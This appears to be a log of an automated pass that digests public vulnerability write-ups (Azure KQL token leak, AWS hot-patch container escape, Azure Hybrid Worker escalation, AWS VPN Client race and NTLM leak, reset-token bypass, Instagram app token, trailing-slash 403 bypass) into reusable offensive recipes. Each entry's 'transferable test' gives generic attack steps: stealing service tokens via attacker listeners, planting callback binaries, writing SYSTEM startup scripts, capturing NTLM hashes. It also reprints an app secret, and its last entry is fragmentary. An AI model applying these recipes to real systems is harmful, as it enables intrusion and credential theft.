DETECTION SIGNAL: a query/DSL/engine that has an EXTERNAL-DATA or federated-query operator (`adx()`, `external_data`, `url_invoke`, `http_request`, `lookup`, `evaluate`, a federated `query`) whose argument is a URL or a cluster/endpoint address; a query editor / workbook / dashboard / "run this query" feature reachable by a lower-privileged user; a service that authenticates outbound calls to that URL with its OWN token (a JWT/Bearer in the `Authorization` header) rather than the caller's; a listener you control receiving a Bearer token. TELL: the external-data function fires an authenticated request to the URL you supplied and the `Authorization` header carries the service's token.
CHAIN: any user who can get a query executed in the target workspace (primitive: a shared dashboard/workbook, a "run query" feature, a scheduled query, or a link the admin opens) -> the query contains an external-data operator pointed at the attacker's listener (primitive: an unsanitised URL argument in the query language) -> the query engine authenticates to that URL with the workspace's JWT (escalation: the service's own credential is sent to the attacker) -> the attacker replays the token against the workspace query API (`https://ade.loganalytics.io/<workspace>/v2/rest/query`) (escalation: token -> authenticated data access) -> the attacker reads the workspace's logs (impact: sensitive information disclosure / data exfiltration; MSRC treated it as by-design and fixed it 2022-05-06). Per doctrine §8: preconditions = the victim runs a query the attacker controls (or the attacker can submit a query to a shared workspace) and the service's outbound call is not restricted to allow-listed endpoints; gain = the workspace's access token and then its log data.
TRANSFERABLE TEST: on ANY query/DSL/engine with an external-data or federated operator — (1) enumerate the operators that accept a URL/endpoint (`adx()`, `external_data`, `url_invoke`, `http_request`, `lookup`, a federated query in a BI tool); (2) point the URL at a listener you control (`https://<you>/Samples`, `http://<you>/`) and run the query; (3) inspect the incoming request's headers for `Authorization: Bearer <jwt>` / `Authorization: SharedAccessSignature ...` / an `X-API-Key` — a service token arriving at your listener is the finding; (4) decode the JWT and replay it against the service's own API to prove data access; (5) also test whether the operator accepts a `http://` (non-TLS) URL and whether it follows redirects, which widens the leak. Rule: **an external-data operator that takes a URL and authenticates with the SERVICE'S OWN token is a token-theft primitive — point it at your listener and read the `Authorization` header.**
DEDUPE: 0 hits across all three write targets for `adx(`, `KQL`, `Log Analytics`, `Azure Monitor`, `external_data`, `JWT token gets exposed`, `ds.dewi.red`, `ade.loganalytics.io`. The recorded Log4Shell material (the JNDI-via-search-parameter entry) is a different class (a log-message lookup sink), and the recorded cloud-metadata/SSRF material is about reaching a cloud metadata endpoint from a server-side fetch, not a query-language operator that leaks the service's own token. NONE records the query-language external-data token leak. New general method -> §17.405.

SOURCE: https://unit42.paloaltonetworks.com/aws-log4shell-hot-patch-vulnerabilities/  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the executive summary, the root-cause analysis, the container-escape demo description, the impact and the mitigations; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no container was run and no hot-patch agent was probed this pass; every quote below is verbatim from the article). NOTE: the article is deliberately HIGH-LEVEL — it names the root cause and the impact but does not publish the exact exploit bytes; the entry records the method as described.
CLASS: sandbox/container escape + local privilege escalation — a HOST-SIDE hot-patch agent invokes a CONTAINER-CONTROLLED BINARY BY NAME with elevated privileges, so a malicious container supplies a binary with that name and the host runs it as root (CWE-269 / CWE-250 / CWE-200).
CORE METHOD:
  1. THE ROOT CAUSE, verbatim: "A malicious container therefore could have included a malicious binary named “java” to trick the installed hot patch solution into invoking it with elevated privileges. The malicious “java” process could then abuse its elevated privileges to escape the container and take over the underlying host. The fixed hot patch solutions now properly containerize container binaires before running them."
  2. THE SCOPE, verbatim: "For example, if you installed the hot patch to a Kubernetes cluster, every container in your cluster can now escape until you either disable the hot patch or upgrade to the fixed version. Aside from containers, unprivileged processes can also exploit the patch to escalate privileges and gain root code execution."
  3. THE ISOLATION-INDEPENDENCE, verbatim: "Containers can escape regardless of whether they run Java applications, or whether their underlying host runs Bottlerocket, AWS's hardened Linux distribution for containers. Containers running with user namespaces or as a non-root user are affected as well."
  4. THE IMPACT, verbatim: "A container escape allows an attacker to extend a campaign beyond a single application and compromise neighboring services. In Kubernetes clusters, a single container escape is unfortunately sometimes enough to take over the entire cluster."
  5. THE CVES, verbatim: "Unit 42 assigned CVE-2021-3100, CVE-2021-3101, CVE-2022-0070 and CVE-2022-0071 to track the vulnerabilities."
  6. THE MITIGATION, verbatim: "On standalone hosts, you can upgrade by running yum update log4j-cve-2021-44228-hotpatch." and "the fixed version for the Debian log4j-cve-2021-44228-hotpatch package is 1.1.17"
DETECTION SIGNAL: a host (or cluster) running a Log4Shell hot-patch agent / DaemonSet / node agent (`log4j-cve-2021-44228-hotpatch`, `kubernetes-log4j-cve-2021-44228-node-agent`) that scans containers and invokes a binary inside them; a container that can place a file named `java` (or whatever binary the agent looks for) in its own filesystem; an escape that works even with user namespaces / non-root containers. TELL: the host-side agent executes the container's `java` binary with elevated privileges.
CHAIN: an attacker who controls a container in the cluster (primitive: any container, no Java app required) -> the container ships a malicious binary named `java` (primitive: a container-controlled file the host agent will invoke) -> the host-side hot-patch agent invokes that binary with elevated privileges (escalation: code execution on the host as root) -> the malicious process escapes the container and takes over the host (impact: container escape / root on the host; in Kubernetes, one escape can be enough to take over the cluster). Per doctrine §8: preconditions = the cluster/host runs a vulnerable hot-patch agent and the attacker controls any container; gain = root code execution on the underlying host.
TRANSFERABLE TEST: on ANY host/cluster running a container-instrumentation or hot-patch agent — (1) enumerate the agent's processes and the binaries it invokes inside containers (the article names `java`; look for the agent's own binary names, `node`, `python`, `sh`); (2) place a malicious binary with that exact name in the container's filesystem (`/usr/bin/java`, or a path on the agent's search list) that calls back to your listener; (3) trigger the agent (run a Java app, or wait for its scan) and check whether the host invokes your binary and whether the callback arrives with the agent's privileges; (4) on Kubernetes, test in a non-root container with user namespaces enabled to confirm the isolation-independence the article claims. Rule: **a host-side agent that invokes a container-controlled binary BY NAME with elevated privileges is a container-escape primitive — supply a malicious binary with that name and let the host run it.**
DEDUPE: 0 hits across all three write targets for `CVE-2021-3100`, `CVE-2021-3101`, `CVE-2022-0070`, `CVE-2022-0071`, `log4j-cve-2021-44228-hotpatch`, `kubernetes-log4j`, `malicious binary named`, `hot patch` (as a container-escape carrier). The recorded Log4Shell entry (the JNDI-via-search-parameter class) is the VULNERABILITY the hot patch mitigates, not the hot patch's own escape; the recorded container-escape material is a PATH-INTERPRETATION SPLIT (a permission checker canonicalises while the class loader treats the string literally) — a different root cause. NONE records the "host agent invokes a container-controlled binary by name" escape. New general method -> §17.406.

SOURCE: https://www.netspi.com/blog/technical/cloud-penetration-testing/abusing-azure-hybrid-workers-part-2/  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200 but the body was TRUNCATED to the summary, the 3-step "Escalating Our Findings" list and the related-posts boilerplate; the browser tool (`browser_exec` -> `document.body.innerText`) returned the FULL 10,518-char article, including the JRDS endpoint, the `/sandboxes` polling, the registration process and the Microsoft response. Route that worked: the browser tool.
STATUS: UNVERIFIED (not reproduced — no Azure tenant was touched and no Automation Account key was read this pass; every quote below is verbatim from the article).
CLASS: cloud privilege escalation / broken access control — a Subscription READER can read an Automation Account key and use it to register an attacker-controlled VM as a Hybrid Worker, then poll the Automation Account's JRDS endpoint for credentials and certificates (CWE-284 / CWE-639 / CWE-269).
CORE METHOD:
  1. THE PRIMITIVE, verbatim: "The NetSPI team recently discovered a set of issues that allows any Azure user with the Subscription Reader role to dump saved credentials and certificates from Automation Accounts. In cases where Run As accounts were used, this allowed for a Reader to Contributor privilege escalation path."
  2. THE KEY READ, verbatim: "To read Automation Account keys, a user only needs the Reader role. To exploit this, we hacked up some source code from Microsoft's Desired State Configuration (DSC) repository."
  3. THE REGISTRATION PROCESS, verbatim: "The repository contained some scripts that are used to register a new Hybrid Worker node, so we bypassed some environment checks and created users/groups that are expected to exist. The registration process looks like this: Generate a new self-signed certificate or use an existing one / Create a payload with some details: HWG name, IP address, certificate thumbprint, etc. / Sign the payload with the AA key / Send a PUT request to the AA with all the above info"
  4. THE NO-PRE-EXISTING-HWG NOTE, verbatim: "This also does not require Hybrid Worker Groups to already be in use; we can supply an arbitrary group name and it will be created. After registering, we can use the certificate and key generated during this process to access the same endpoints that we identified earlier. You also don't need a Log Analytics workspace key to register because not all AAs are linked to a workspace."
  5. THE JRDS ENDPOINT, verbatim: "Every Automation Account has a “Job Runtime Data Service” endpoint, or JRDS, which Hybrid Workers use to poll for jobs and request credentials."
  6. THE JOB POLL, verbatim: "You can only get that MSI secret after receiving a job from the JRDS endpoint. This can be achieved by polling the /sandboxes endpoint. HWGs handle jobs in a first-come-first-serve fashion, so whichever node polls the endpoint first starts first. By default, nodes will poll every 60 seconds so if polled constantly, then we should almost always beat out the other nodes and get a job with a secret."
  7. THE FULL CHAIN, verbatim: "From start to finish, this exploit works as follows: 1. Attacker with Reader access reads the victim Automation Account key 2. Attacker uses this key to register their own Virtual Machine in their own tenant as a Hybrid Worker node 3. Attacker can dump any credentials or certificates from the victim AA and use them to authenticate"
  8. THE FIX, verbatim: "Microsoft has also updated the Reader role so that it no longer has the ListKeys permission on Automation Accounts and can no longer fetch Automation Account keys."
  9. THE TIMELINE, verbatim: "October 25, 2021: Initial report submitted / December 13, 2021: Second report submitted with details of full privilege escalation / December 31, 2021: $10k bounty awarded / March 14, 2022: Patch is applied"
DETECTION SIGNAL: a cloud tenant where a LOW-PRIVILEGED role (Reader / Viewer / Monitoring Reader) can list or read an integration/registration key (`ListKeys`, `listKeys`, `GET .../listKeys`, an Automation Account key, a workspace key, a registration token); a self-registration endpoint that accepts a SIGNED payload (a certificate + thumbprint + group name) and a PUT/POST to register a node; a job/credential endpoint (`/sandboxes`, JRDS) that hands out credentials or an MSI secret to whichever node polls first. TELL: a Reader-role principal can read the key and register a node in its OWN tenant against the victim's Automation Account.
CHAIN: an attacker with the Subscription Reader role (primitive: a low-priv read-only role) -> the Reader role can read the victim Automation Account key (`ListKeys`) (primitive: a read-only role with a key-reading permission) -> the attacker generates a self-signed certificate, builds a payload (HWG name, IP, thumbprint), signs it with the AA key and PUTs it to the victim AA, registering the attacker's own VM in the attacker's own tenant as a Hybrid Worker (escalation: a rogue node is trusted by the victim's AA) -> the attacker polls the JRDS `/sandboxes` endpoint, wins the first-come-first-serve job race and receives the MSI secret / credentials / certificates (escalation: the AA hands its stored credentials to the rogue node) -> the attacker uses those credentials to authenticate (impact: Reader -> Contributor privilege escalation; $10,000 bounty; patched 2022-03-14). Per doctrine §8: preconditions = the attacker holds a Reader (or any role with `ListKeys`) on the subscription and the victim AA has stored credentials/Run As accounts; gain = the victim AA's credentials and certificates, hence Contributor-level access.
TRANSFERABLE TEST: on ANY cloud tenant with a hybrid-worker / runbook / automation / managed-agent feature — (1) as the LOWEST-privilege role (Reader/Viewer), enumerate every endpoint that returns a key/secret (`GET /providers/Microsoft.Automation/automationAccounts/<name>/listKeys`, the equivalent `listKeys`/`listSecrets` action, a registration token) and confirm a 200 with a key; (2) take the registration flow from the vendor's own SDK/DSC scripts (a self-signed cert + a signed payload + a PUT) and replay it with a key from the victim tenant, registering a node you control (your own VM, your own tenant); (3) poll the job/credential endpoint (`/sandboxes`, JRDS, the equivalent) continuously to win the first-come-first-serve race and read the credentials/certificates/MSI secret the service hands out; (4) replay a dumped credential against the cloud API to prove the escalation. Rule: **a read-only role that can read an integration key plus a self-registration API is a privilege-escalation chain — register your own node with the victim's key, then poll the job endpoint until the service hands you its credentials.**
DEDUPE: 0 hits across all three write targets for `Hybrid Worker`, `Hybrid Worker Group`, `HWG`, `Automation Account`, `JRDS`, `/sandboxes`, `ListKeys`, `Run As account`, `NetSPI`, `Magri`. The recorded cloud-priv-esc material is about cloud metadata/IAM and SSRF->metadata chains; the recorded Azure material is the `adx()` token leak (§17.405) and the Graph-API change-notification exfiltration. NONE records the "Reader reads the AA key -> registers a rogue Hybrid Worker -> polls JRDS for credentials" chain. New general method -> §17.407.

SOURCE: https://rhinosecuritylabs.com/aws/cve-2022-25165-aws-vpn-client/  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the affected-product note, the two CVE summaries, the arbitrary-file-write technical details, the UNC-path technical details and the disclosure timeline; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no AWS VPN Client was installed and no OpenVPN config was imported this pass; every quote below is verbatim from the article).
CLASS: local privilege escalation (arbitrary file write as SYSTEM) + credential disclosure (Net-NTLMv2 hash leak) — a privileged Windows service VALIDATES a config file and then EXECUTES it, and the validation happens BEFORE execution, so the file can be swapped in the window; a file-path argument that is opened with `File.Open` leaks the user's NTLM hash to a UNC path (CWE-367 / CWE-732 / CWE-200 / CWE-522).
CORE METHOD:
  1. THE TWO CVEs, verbatim: "The AWS VPN Client application is affected by an arbitrary file write as SYSTEM, which can lead to privilege escalation and an information disclosure vulnerability that allows the user’s Net-NTLMv2 hash to be leaked via a UNC path in a VPN configuration file. These vulnerabilities are confirmed to affect version 2.0.0 and have been fixed in version 3.0.0."
  2. THE RACE, verbatim: "AWS VPN Client attempts to restrict the OpenVPN directives which can be used in the configuration file, but the check fails as it is performed prior to the execution of the OpenVPN executable. This makes it possible to race the execution of the OpenVPN executable after the configuration file has been validated and inject disallowed directives into the file."
  3. THE RACE HARNESS, verbatim: "It is easy enough to use a Powershell script to then monitor the log file and upon successful validation of the configuration file immediately write the malicious directive to the configuration file prior to the OpenVPN executable processing it."
  4. THE DIRECTIVE, verbatim: "Although we cannot directly run commands, it is still possible to use the “log” directive to redirect log output to any path or file of our choosing. Since execution is done as the SYSTEM user this gives us a privileged file write where we partially control the content. In the simplest case this could be used to write a batch script to an administrator’s startup directory."
  5. THE SCRIPT-SECURITY WALL, verbatim: "AWS VPN service starts the OpenVPN executable with the “–script-security 1” flag, which prevents external binaries or scripts from being executed."
  6. THE UNC LEAK, verbatim: "AWSVPNClient.Core.dll contains OvpnConfigParser.cs which has the “CheckFilePath” method used to check if a file path is valid. This simply calls File.Open on the supplied file name." and "This can be exploited by providing a file that contains UNC paths as the file path. When the file is validated before being imported it will open the UNC path and send the user’s Net-NTLMv2 hash to an external server."
  7. THE DIRECTIVES THAT TAKE A PATH, verbatim: "Some examples of valid directives that accept files paths are * auth-user-pass * ca"
  8. THE TIMELINE, verbatim: "2/15/2022 | Vulnerabilities reported to AWS / 2/16/2022 | Acknowledged by AWS / 3/4/2022 | AWS confirmed the issues have been addressed in version 3.0.0 / 4/12/2022 | Full Disclosure (blog post) released"
DETECTION SIGNAL: a privileged service that VALIDATES a caller-supplied config file (an allow-list of directives/keys) and then EXECUTES it with the service's own privileges; a validation step that runs BEFORE the execution step (a log line showing "validation succeeded" followed by the execution); a config directive that writes a file or runs a command (`log`, `config`, `tls-auth`, `auth-user-pass`, `ca`, `up`, `down`, `client-connect`); a file-path argument that the service OPENS to check existence (`File.Open`, `open()`, `stat`, `access`) rather than just string-checking. TELL: the service validates the file, then a separate privileged process reads it — the window between the two is the race.
CHAIN: a low-privileged local user (primitive: an ordinary local account) -> the user imports a VPN config file that passes the service's directive allow-list (primitive: a validated config) -> a PowerShell watcher monitors the service log and, the moment validation succeeds, rewrites the config to add a disallowed directive (escalation: the file is swapped in the validate->execute window — a TOCTOU) -> the service executes OpenVPN as SYSTEM and the `log` directive writes an attacker-chosen file (escalation: arbitrary file write as SYSTEM) -> the attacker writes a batch script into an administrator's startup directory (impact: code execution as SYSTEM / local privilege escalation). The SECOND chain: a config whose file-path directive (`auth-user-pass`, `ca`) is a UNC path -> the service's `File.Open` check opens the UNC path -> the user's Net-NTLMv2 hash is sent to the attacker's server (impact: credential disclosure -> relay/ATO). Per doctrine §8: preconditions = the attacker is a low-priv local user who can import a VPN config (or, for the hash leak, can make the victim import one) and the service runs a privileged OpenVPN; gain = arbitrary file write as SYSTEM (priv esc) or the victim's Net-NTLMv2 hash (credential theft).
TRANSFERABLE TEST: on ANY privileged service that validates a config/script/manifest and then executes it — (1) capture the validation log/response and the execution event; (2) write a watcher that polls the validation state and, the instant it succeeds, rewrites the file (a PowerShell/Python loop on the log file or the file's mtime); (3) add a directive that writes a file or runs a command and confirm the privileged process acts on it; (4) if the service blocks command execution (`--script-security 1`, a directive allow-list), use a FILE-WRITE directive (`log`, `output`, `config`) to write a script into a privileged startup/run-key location; (5) for the hash leak, set a file-path argument to `\\\\<attacker>\\share\\x` and run a listener (`responder`, `smbserver.py`) to capture the Net-NTLMv2 hash. Rule: **a service that validates a config and then executes it is a TOCTOU — race the window to swap in a directive, and if command execution is blocked use a file-write directive to land a script in a privileged startup path; a file-path argument that the service opens is a UNC-path NTLM-hash leak.**
DEDUPE: 0 hits across all three write targets for `CVE-2022-25165`, `CVE-2022-25166`, `AWS VPN Client`, `OpenVPN`, `auth-user-pass`, `Net-NTLMv2`, `UNC path`, `OvpnConfigParser`, `CheckFilePath`, `script-security 1`, `log directive`. The recorded TOCTOU material is about async-export re-authorisation, DNS resolve-then-fetch, a BD-J path-interpretation split, a privileged-helper signature-check-then-launch symlink swap, an entitlement/purchase gate, and HTTP/3 races — NONE is a validate-then-execute CONFIG race with a file-write directive. The recorded NTLM/UNC material is not present. New general method -> §17.408.

(2) securecloud.blog / Azure Monitor (live domain HIJACKED, read via the Wayback capture) — the KQL `adx()` operator takes an ARBITRARY URL and the query engine authenticates to it with the WORKSPACE'S OWN JWT, so the token is captured by the attacker's listener and replayed against `ade.loganalytics.io/<ws>/v2/rest/query`; MSRC called it by-design and fixed it 2022-05-06 -> §17.405. (3) Unit42 / AWS Log4Shell hot patch — a HOST-SIDE hot-patch agent invokes a CONTAINER-CONTROLLED BINARY BY NAME (`java`) with elevated privileges, so a malicious container ships a binary with that name and the host runs it as root; works with user namespaces / non-root containers; CVE-2021-3100/3101, CVE-2022-0070/0071 -> §17.406. (4) NetSPI / Azure Hybrid Workers Part 2 — a Subscription READER reads the Automation Account key (`ListKeys`), generates a self-signed cert, signs a payload (HWG name/IP/thumbprint) and PUTs it to register the attacker's OWN VM in the attacker's OWN tenant as a Hybrid Worker, then polls the JRDS `/sandboxes` endpoint to win the first-come-first-serve race and receive the MSI secret / credentials / certificates -> Reader-to-Contributor priv esc, $10k -> §17.407. (5) Rhino Security Labs / AWS VPN Client — a privileged service VALIDATES a config and then EXECUTES it, so a PowerShell watcher races the validate->execute window and injects the OpenVPN `log` directive for an arbitrary file write as SYSTEM (command execution blocked by `--script-security 1`); separately, a file-path directive (`auth-user-pass`, `ca`) set to a UNC path makes the service's `File.Open` check leak the user's Net-NTLMv2 hash -> §17.408. ===== REPORT-READER PASS 2026-11-10 — batch 131 (6 assigned sources, PentesterLand/Medium) =====

SOURCE: https://medium.com/techiepedia/password-reset-to-admin-access-3b2a649bdc3  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200; the story body is fully visible ABOVE the Medium member-only regwall (the regwall follows the story, it does not replace it). No fallback route needed.
STATUS: UNVERIFIED (not reproduced — no target API was called this pass; every quote below is verbatim from the article).
CLASS: authentication bypass / privilege escalation — the PASSWORD-RESET TEMP TOKEN is accepted as a BEARER token by the application's OTHER API endpoints and carries ADMIN authorization, so a token anyone can obtain by requesting a reset for their own account unlocks every data/function in the environment (CWE-284 / CWE-287 / CWE-669).
CORE METHOD:
  1. THE SETUP, verbatim: "While testing a web application that used a web GUI over the top of an API, I noted the calls to the API where authorized with a JWT token set in a Authorization header."
  2. THE RESET TOKEN, verbatim: "When requesting a password reset you are emailed a link to a form to update the password. The password reset function would interact with the same API as the rest of the app, except now using a TEMP token, since obviously you cannot be authenticated at this time."
  3. THE TEST, verbatim: "Dropping the TEMP token into the other API calls saved in Burp's history, I was able to confirm that the TEMP token add admin authorization and would allow access to all data and functions in the environment."
  4. THE WARNING, verbatim: "Since the temp token is something anyone can generate using the system, it is very important to ensure you test the authorization around it and be sure to not overlook the simple mechanisms surrounding authentication."
DETECTION SIGNAL: a password-reset / email-verification / magic-link flow that issues a TEMP token (a bearer value in an `Authorization` header, a query param, or a JSON field) SEPARATE from the session cookie; the same API host serving both the authenticated app and the reset flow; a reset token that is a self-contained signed/encrypted value rather than a random one-time secret looked up server-side. TELL: replaying the reset token against an unrelated authenticated endpoint returns 200 with privileged data instead of 401/403.
CHAIN: any unauthenticated attacker (primitive: anyone can request a reset for an account they control) -> the reset flow issues a TEMP token (primitive: a bearer credential not tied to the reset scope) -> the attacker replays that TEMP token in the `Authorization` header of OTHER API calls saved in the proxy history (escalation: the token is accepted outside the reset flow and its scope check is missing) -> the TEMP token authorizes ADMIN functions and all data (impact: authentication bypass / privilege escalation to admin; the article's finding was accepted). Per doctrine §8: preconditions = the attacker can request a password reset for an account they control (no auth needed) and the app uses the same API host for the reset flow; gain = admin authorization over all data and functions.
TRANSFERABLE TEST: on ANY app whose password-reset / email-verification / magic-link flow issues a token — (1) capture the reset request and the token it returns (header, query param or JSON field); (2) replay that token verbatim in the `Authorization` header (or its original slot) of EVERY other API call saved in the proxy history — the profile, the admin, the user-list, the export, the internal endpoints; (3) a 200/302 with privileged data (instead of 401/403) is the finding; (4) also test the reverse: take a NORMAL session token and replay it against the RESET endpoint to see whether the reset flow accepts a full session. Rule: **a reset token is a bearer credential — replay it against every other endpoint and check whether its authorization is broader than the reset scope; a TEMP token that unlocks admin functions is an auth bypass.**
DEDUPE: 0 hits across all three write targets for `TEMP token`, `temp token`, `techiepedia`, `hogarth`, `reset` + `admin authorization`. The recorded reset-token material is about LEAKING/CAPTURING/FORGING a reset token (§17.9 reset-email array type confusion, §17.289 weak-key forged reset token, #635 predictable/eternal reset tokens, §17.368 a directory API that returns a reset token, V-06 reset Host injection) — NONE records the reset token being replayed as a BEARER on OTHER endpoints to gain ADMIN authorization. New general method -> §17.409.

SOURCE: https://philippeharewood.com/instagram-app-access-token/  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the token taxonomy, the Bloks setup, the Base64 decode, the upload request, the `graph.facebook.com/app/roles` check, the Meta impact statement and the timeline; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no Meta/Instagram endpoint was called this pass; every quote below is verbatim from the article).
CLASS: sensitive information disclosure WITH PoC -> application access token -> app administration — a FIRST-PARTY app's APPLICATION ACCESS TOKEN (`appID|secret`) is embedded in a Base64 blob inside a CLIENT-SIDE Bloks bundle, so anyone who fetches the bundle recovers a token that authenticates to app-level ADMIN endpoints (CWE-200 / CWE-919 / CWE-284).
CORE METHOD:
  1. THE TOKEN TAXONOMY, verbatim: "Application Access Token — used for app level admin role endpoints, providing administration in an application, the token is normally in the form `appID|[alphanumeric+special characters]`" (contrast: a CLIENT token, "obtained via getting the alphanumeric secret from `graph.facebook.com/appID?fields=login_secret` and concatenating in the form `appID|login_secret`").
  2. THE CARRIER, verbatim: "Meta has been working for a a few years on Bloks, 'a framework that enables both management logic to be defined once server-side and rendered as a native application'." and "The general setup has the following parameters: `app_id`, `params` and `versioning_id`, with the response given in a bundle tree."
  3. THE EMBEDDED TOKEN, verbatim (the Base64-decoded Bloks component/action string): "catalog_item_uploads124024574287414|Jor32q7Rh50x2LZL1Aw2F4f8bjw_f02_f03ig.action.media.UploadMediaV3" — i.e. the value `124024574287414|Jor32q7Rh50x2LZL1Aw2F4f8bjw` is the appID|secret pair.
  4. THE REQUEST, verbatim: `POST /catalog_item_uploads/D52D5D86-308F-4DA5-B353-46B58BF47BD4 HTTP/2` / `Host: rupload.facebook.com` / `Authorization: OAuth 124024574287414|Jor32q7Rh50x2LZL1Aw2F4f8bjw`.
  5. THE TELL, verbatim: "The token defined in the `Authorization` header here isn't a client token, a good indicator in my experience to notice this, is that a client token has the following pattern `[0-9]|[a-z0-9]*`. So this is an application token."
  6. THE NON-DESTRUCTIVE CHECK, verbatim: "A non destructive call to `graph.facebook.com/app/roles` with the token was used since I didn't know what would happen to Instagram if I started to intensely test it. This listed about 25 Facebook user IDs with administrator or developer access".
  7. THE IMPACT, verbatim: "You identified an endpoint issue that could have allowed a malicious actor to retrieve a first-party app IG access token. While we have protections in place that would have prevented further impact, your report led us to strengthen our defenses..." ($30,000 bounty + $6,000 Platinum league + $2,250 time-delay + $50 BountyConEdu).
DETECTION SIGNAL: a client-side bundle / server-rendered app framework (Bloks, Next.js `__NEXT_DATA__`, a React/Vue SSR state blob, a GraphQL manifest, a mobile app's JS bundle) that contains Base64/hex-encoded strings; a decoded string containing an `appID|secret` / `client_id|client_secret` / `key|secret` pair; a request whose `Authorization` header carries a value that is NOT a user token (a client token matches `[0-9]|[a-z0-9]*`; an app token has special characters). TELL: the bundle's decoded string works as a bearer credential against the app's own admin/roles endpoint.
CHAIN: any unauthenticated attacker (primitive: the bundle is served to the client) -> the attacker Base64-decodes the strings in the Bloks bundle and finds an `appID|secret` pair (primitive: a first-party app credential embedded in client-side content) -> the attacker sends it as `Authorization: OAuth <appID>|<secret>` to the app's upload/GraphQL endpoint (escalation: the credential is accepted) -> the attacker calls a non-destructive admin endpoint (`graph.facebook.com/app/roles`) and reads the app's administrator/developer user list (impact: application access token -> administration of the app; $30,000 bounty; Meta removed the token-embedded endpoints within hours). Per doctrine §8: preconditions = the app serves a client-side bundle containing the token and the token is still valid; gain = a first-party application access token and the app's admin-role user list.
TRANSFERABLE TEST: on ANY app that serves a client-side bundle / SSR state blob / mobile JS bundle — (1) fetch the bundle and grep for Base64/hex blobs; decode every candidate (`base64 -d`, `hex -r`) and grep for `|`-separated pairs, `secret`, `token`, `key`, `appID|`, `client_id|`; (2) take any decoded `appID|secret`-shaped value and send it as `Authorization: OAuth <value>` (or `Authorization: Bearer <value>`) to the app's own API host; (3) confirm with a NON-DESTRUCTIVE read (`GET /app/roles`, `GET /me`, `GET /debug`, a roles/permissions endpoint) BEFORE any write; (4) classify the token by shape (a client token is `[0-9]|[a-z0-9]*`; an app token carries special characters) to judge whether it reaches admin endpoints. Rule: **a first-party app credential embedded in a client-side bundle is a token-theft primitive — decode the bundle, replay the `appID|secret` pair, and confirm with a read-only roles call before touching anything destructive.**
DEDUPE: 0 hits across all three write targets for `Bloks`, `bloks`, `application access token`, `login_secret`, `catalog_item_uploads`, `UploadMediaV3`, `rupload.facebook`, `harewood`, `appID|`, `graph.facebook.com/app/roles`. The recorded token-theft material is about tokens leaked in RESPONSES/headers/logs or forged with a weak key (§17.289, §17.8, §17.258) — NONE records a first-party APPLICATION token embedded in a CLIENT-SIDE BUNDLE and replayed from the `Authorization` header. New general method -> §17.410.

SOURCE: https://remonsec.com/posts/getting-first-swag-SIDN/  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the recon, the 403, the trailing-slash bypass, the archive contents and the outcome; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no SIDN host was touched this pass; every quote below is verbatim from the article).
CLASS: broken access control / path normalization -> sensitive information disclosure WITH PoC — a directory that returns 403 WITHOUT a trailing slash serves its contents WITH one, exposing a private mailing-list archive of internal company e-mail (CWE-552 / CWE-548 / CWE-200 / CWE-284).
CORE METHOD:
  1. THE RECON, verbatim: "I fire up my Kali Linux, start my recon with Sublist3r. From Sublist3r I found an interesting domain called mailman.sidn.nl"
  2. THE 403, verbatim: "After playing around the target I found a directory called mailman.sidn.nl/pipermail But there was a 403 for that directory"
  3. THE BYPASS, verbatim: "But then I put a '/' after the pipermail directory Like This: mailman.sidn.nl/pipermail/ Boom … It takes me inside the directory."
  4. THE CONTENT, verbatim: "Inside that directory, I found lots of private emails about the company. like their product relates emails, production emails, internal dev mails, etc."
DETECTION SIGNAL: a directory path that returns 403/401 on the bare form (`/pipermail`, `/admin`, `/backup`, `/files`, `/mailman`, `/lists`) but 200 on the trailing-slash form (`/pipermail/`); a web server whose access-control rule matches the exact path without the slash (an Apache/Nginx `Location /pipermail` block, a WAF rule, an app router that 403s the bare directory) while the file-serving layer treats `/pipermail/` as the directory index. TELL: the SAME path with one extra `/` returns 200 and a directory listing or archive index.
CHAIN: any unauthenticated attacker (primitive: can request the directory) -> the bare directory returns 403 (primitive: an access-control rule keyed on the exact path) -> the attacker appends a trailing slash and the server serves the directory index (escalation: the access-control rule is bypassed by a path-normalization mismatch) -> the attacker reads the private mailing-list archive — product-release, production and internal-dev e-mail (impact: sensitive information disclosure WITH PoC; the report was accepted with a SWAG reward). Per doctrine §8: preconditions = the target serves a directory whose access rule matches the bare path but not the trailing-slash form; gain = the archive's private internal e-mail.
TRANSFERABLE TEST: on ANY 403/401 directory response — (1) replay the SAME path with a trailing slash (`/pipermail` -> `/pipermail/`) and with a double slash (`/pipermail//`), a `;` (`/pipermail;/`), a dot-segment (`/pipermail/./`) and a case variant; (2) a 200 with a directory index/archive listing is the finding; (3) also try the reverse on a 200 directory (remove the slash) to map which form the access rule actually matches; (4) feed the discovered archive/index paths to `gau`/`waybackurls` to enumerate the rest of the exposed content. Rule: **a 403 on a bare directory is a path-normalization mismatch, not an access control — retry the same path with a trailing slash (and `//`, `;`, `/./`, case variants) and check whether the directory index is served.**
DEDUPE: 0 hits across all three write targets for `pipermail`, `mailman`, `sidn`, `sidn.nl`, `403` + `trailing`. The recorded `trailing slash` material is ROUTER-vs-MIDDLEWARE normalization on API routes (V-xx "trailing slash / `;` / `//`" and the RPO/relative-subresource entries) — NONE records a 403 on a bare DIRECTORY becoming a 200 directory index with a trailing slash. No new §17 slot (a well-known path-normalization primitive; the generic dir-indexing probe already covers the request shape).

CLASS: sensitive information disclosure WITH PoC / internal file read — an exposed `Makefile` (and adjacent build/config artifacts) leaks the build details, and an exposed `Sql.DB` can be downloaded and dumped (CWE-548 / CWE-552 / CWE-200).
CORE METHOD:
  1. THE RECON, verbatim: "I used Knock.py tool [https://github.com/guelfoweb/knock] to enumerate the subdomains. cmd used for enumeration python3 knock.py -u exmaple.com"
  2. THE DIR BRUTE, verbatim: "I used dirsearch tool [https://github.com/maurosoria/dirsearch] and used seclist wordlist for enumeration. cmd used python3 dirsearch.py -u example.com /usr/share/seclist/common.txt"

TELL: the `Makefile` is readable (200) and its build targets/paths point at the adjacent `Sql.DB`, which is also downloadable.
